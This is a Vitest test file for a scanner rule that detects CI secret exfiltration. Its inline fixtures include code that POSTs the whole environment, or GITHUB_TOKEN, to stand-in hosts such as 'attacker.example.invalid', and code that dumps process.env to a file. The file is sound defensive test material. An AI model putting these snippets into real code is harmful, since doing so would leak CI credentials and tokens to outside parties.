/**
 * L9 v2 — functional + evidence-integrity tests.
 *
 * Covers every CHARTER lethal edge case plus chain-shape / confidence
 * assertions. Run ONLY this file per the sub-agent orchestration
 * protocol:
 *   pnpm --filter=@mcp-sentinel/analyzer vitest run
 *     src/rules/implementations/l9-ci-secret-exfiltration/__tests__/index.test.ts
 */

import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { CISecretExfiltrationRule } from "../index.js";
import type { AnalysisContext } from "../../../../engine.js";
import { isLocation } from "../../../location.js";
import type {
  EvidenceChain,
  SourceLink,
  SinkLink,
  MitigationLink,
  VerificationStep,
} from "../../../../evidence.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const FIX = join(HERE, "..", "__fixtures__");

const rule = new CISecretExfiltrationRule();

function sourceContext(text: string): AnalysisContext {
  return {
    server: { id: "l9-t", name: "l9-test-server", description: null, github_url: null },
    tools: [],
    source_code: text,
    dependencies: [],
    connection_metadata: null,
  };
}

function loadFixture(name: string): AnalysisContext {
  return sourceContext(readFileSync(join(FIX, name), "utf8"));
}

function getLinksOfType<T extends { type: string }>(chain: EvidenceChain, type: string): T[] {
  return chain.links.filter((l) => l.type === type) as T[];
}

// ─── True positives ───────────────────────────────────────────────────────

describe("L9 — fires (true positives)", () => {
  it("CHARTER edge case: direct env→fetch exfil of GITHUB_TOKEN (body property)", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].rule_id).toBe("L9");
    expect(results[0].severity).toBe("critical");
  });

  it("CHARTER edge case: encoded-exfil-follow — Buffer.from base64 wrapping NPM_TOKEN in URL", () => {
    const results = rule.analyze(loadFixture("true-positive-02-base64-wrapped-npm-token.ts"));
    expect(results.length).toBeGreaterThan(0);
    const first = results[0];
    const sources = getLinksOfType<SourceLink>(first.chain, "source");
    expect(sources.length).toBeGreaterThanOrEqual(1);
    // Multi-hop: alias-binding + template-embed + wrapper-call.
    expect(first.chain.links.filter((l) => l.type === "propagation").length).toBeGreaterThanOrEqual(1);
  });

  it("CHARTER edge case: indirect-log-exposure — AWS_SECRET_ACCESS_KEY logged via console.log", () => {
    const results = rule.analyze(loadFixture("true-positive-03-log-aws-secret.ts"));
    expect(results.length).toBeGreaterThan(0);
    const severities = results.map((r) => r.severity);
    // Log-channel severity is "high".
    expect(severities).toContain("high");
  });

  it("CHARTER edge case: bulk-env-dump — JSON.stringify(process.env) flows to fetch", () => {
    const bulk = `
async function dump() {
  const body = JSON.stringify(process.env);
  await fetch("https://drop.example.invalid", { method: "POST", body });
}
dump();
`;
    const results = rule.analyze(sourceContext(bulk));
    expect(results.length).toBeGreaterThan(0);
    const factors = results[0].chain.confidence_factors.map((f) => f.factor);
    expect(factors).toContain("secret_name_heuristic");
    // Bulk variant should set bulk-specific factor rationale.
    const heuristic = results[0].chain.confidence_factors.find((f) => f.factor === "secret_name_heuristic");
    expect(heuristic?.rationale.toLowerCase()).toContain("bulk");
  });

  it("CHARTER edge case: artifact-dump-via-file-write — fs.writeFile with JSON.stringify(process.env)", () => {
    const src = `
import * as fs from "fs";
function dumpArtifact() {
  fs.writeFileSync("./out.json", JSON.stringify(process.env));
}
dumpArtifact();
`;
    const results = rule.analyze(sourceContext(src));
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].severity).toBe("critical");
    const sinks = getLinksOfType<SinkLink>(results[0].chain, "sink");
    expect(sinks[0].sink_type).toBe("file-write");
  });
});

// ─── True negatives ───────────────────────────────────────────────────────

describe("L9 — does not fire (true negatives)", () => {
  it("CHARTER edge case: secret-name-allowlist — PORT env read flowing to fetch must NOT fire", () => {
    const results = rule.analyze(loadFixture("true-negative-01-port-env-fetch.ts"));
    const critical = results.filter((r) => r.severity === "critical");
    expect(critical.length).toBe(0);
  });

  it("CHARTER edge case: secret-name-allowlist — NODE_ENV logged must NOT fire", () => {
    const results = rule.analyze(loadFixture("true-negative-02-node-env-log.ts"));
    expect(results.length).toBe(0);
  });

  it("masking-primitive in scope drops severity to informational", () => {
    const src = `
import { addMask } from "@actions/core";
async function publish() {
  const token = process.env.GITHUB_TOKEN;
  addMask(token);
  console.log("using token:", token);
}
publish();
`;
    const results = rule.analyze(sourceContext(src));
    // Should fire but with informational severity (masking neutralises log channel).
    expect(results.length).toBeGreaterThan(0);
    const severities = results.map((r) => r.severity);
    expect(severities).toContain("informational");
  });
});

// ─── Evidence integrity ───────────────────────────────────────────────────

describe("L9 — evidence integrity", () => {
  it("every link with a location field is a structured Location; every VerificationStep.target is a Location", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    expect(results.length).toBeGreaterThan(0);
    for (const r of results) {
      for (const link of r.chain.links) {
        if (link.type === "impact") continue;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        expect(isLocation((link as any).location)).toBe(true);
      }
      for (const step of r.chain.verification_steps ?? []) {
        expect(isLocation(step.target)).toBe(true);
      }
    }
  });

  it("every chain has source (environment) + sink + mitigation + impact", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    expect(results.length).toBeGreaterThan(0);
    const chain = results[0].chain;
    const sources = getLinksOfType<SourceLink>(chain, "source");
    const sinks = getLinksOfType<SinkLink>(chain, "sink");
    const mitigations = getLinksOfType<MitigationLink>(chain, "mitigation");
    expect(sources.length).toBeGreaterThanOrEqual(1);
    expect(sources[0].source_type).toBe("environment");
    expect(sinks.length).toBeGreaterThanOrEqual(1);
    expect(mitigations.length).toBeGreaterThanOrEqual(1);
  });

  it("cites CVE-2025-30066 on the threat reference", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    expect(results[0].chain.threat_reference?.id).toBe("CVE-2025-30066");
  });

  it("verification_steps contains the CI-masking configuration step", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    const steps = results[0].chain.verification_steps as VerificationStep[];
    const configSteps = steps.filter((s) => s.step_type === "check-config");
    expect(configSteps.length).toBeGreaterThanOrEqual(1);
  });
});

// ─── Confidence contract ─────────────────────────────────────────────────

describe("L9 — confidence contract", () => {
  it("caps confidence at 0.88 per charter", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    for (const r of results) {
      expect(r.chain.confidence).toBeLessThanOrEqual(0.88);
      expect(r.chain.confidence).toBeGreaterThanOrEqual(0.05);
    }
  });

  it("records required_factors per CHARTER", () => {
    const results = rule.analyze(loadFixture("true-positive-01-fetch-env-token.ts"));
    expect(results.length).toBeGreaterThan(0);
    const factors = results[0].chain.confidence_factors.map((f) => f.factor);
    expect(factors).toContain("secret_name_heuristic");
    expect(factors).toContain("unmitigated_sink_reachability");
  });
});

// ─── Mutation ────────────────────────────────────────────────────────────

describe("L9 — mutation: removing the exfil call removes the finding", () => {
  it("replacing fetch with internal-only assignment removes the critical finding", () => {
    const vulnerable = `
async function go() {
  const t = process.env.GITHUB_TOKEN;
  await fetch("https://attacker.example.invalid", { body: t });
}
go();
`;
    const safe = `
async function go() {
  const t = process.env.GITHUB_TOKEN;
  const localState = { token: t };
  return localState;
}
go();
`;
    const vulnCritical = rule.analyze(sourceContext(vulnerable)).filter((r) => r.severity === "critical");
    const safeCritical = rule.analyze(sourceContext(safe)).filter((r) => r.severity === "critical");
    expect(vulnCritical.length).toBeGreaterThan(0);
    expect(safeCritical.length).toBe(0);
  });
});
